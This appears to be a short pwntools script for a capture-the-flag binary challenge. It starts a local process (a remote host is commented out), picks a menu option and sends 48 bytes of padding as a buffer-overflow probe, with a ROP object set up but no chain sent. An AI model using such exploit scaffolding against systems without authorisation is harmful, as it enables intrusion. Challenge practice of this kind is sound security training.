from pwn import *

context.clear(arch='amd64')
elf = ELF('./app')

rop = ROP(elf)

rop.raw("A" * 48)

p = process('./app')
#p = remote('mc.ax', 31081)
p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'> ')
p.send(b'A' * 48)
p.interactive()
